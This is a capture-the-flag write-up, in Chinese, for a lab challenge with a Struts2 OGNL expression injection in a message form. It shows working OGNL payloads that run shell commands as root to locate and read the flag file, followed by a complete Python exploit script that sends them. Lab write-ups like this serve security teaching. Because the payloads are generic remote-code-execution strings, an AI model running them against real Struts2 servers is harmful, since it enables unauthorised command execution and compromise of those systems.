# X-035-24 OGNL fun

> Can you find a way in? Hint: Look at /tmp

访问站点首页是一个“客服留言”表单，提交后会在结果页回显我们提交的内容。尝试在消息中提交表达式后发现页面会对表达式进行求值，判断存在 Struts2 OGNL 表达式注入（服务端会把表达式作为 OGNL 解析并回显）。

利用 OGNL 可以执行任意系统命令，于是直接通过命令执行定位并读取 flag。

在消息处提交：`%{1+1}`：
![image.png](https://x/x12105555377.png)
结果页回显为：`2`，说明表达式被执行。

提交：
```
%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}
```
![image.png](https://x/x12105700937.png)
回显：`uid=0(root) gid=0(root) groups=0(root)`，确认命令执行且为 root 权限。

寻找 flag 的位置：
```
%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('find / -maxdepth 3 -type f -iname flag*').getInputStream()).useDelimiter('\\A').next()}
```
![image.png](https://x/x12105803250.png)
回显：`/tmp/flag`。

读取 flag：
```
%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('cat /tmp/flag').getInputStream()).useDelimiter('\\A').next()}
```
![image.png](https://x/x12105838897.png)
## EXP
```python
import re
import requests

URL = 'http://ip32798/sendMessageAction.action'

def run(payload):
    r = requests.post(URL, data={'message': payload}, timeout=5)
    m = re.findall(r'<p>(.*?)</p>', r.text, flags=re.S)
    print(m[0].strip() if m else r.text)

# 1) 探测 OGNL
run(r"%{1+1}")  # 期望回显 2

# 2) 命令执行验证
run(r"%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}")

# 3) 定位 flag 路径
run(r"%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('find / -maxdepth 3 -type f -iname flag*').getInputStream()).useDelimiter('\\A').next()}")

# 4) 读取 flag
run(r"%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('cat /tmp/flag').getInputStream()).useDelimiter('\\A').next()}")
```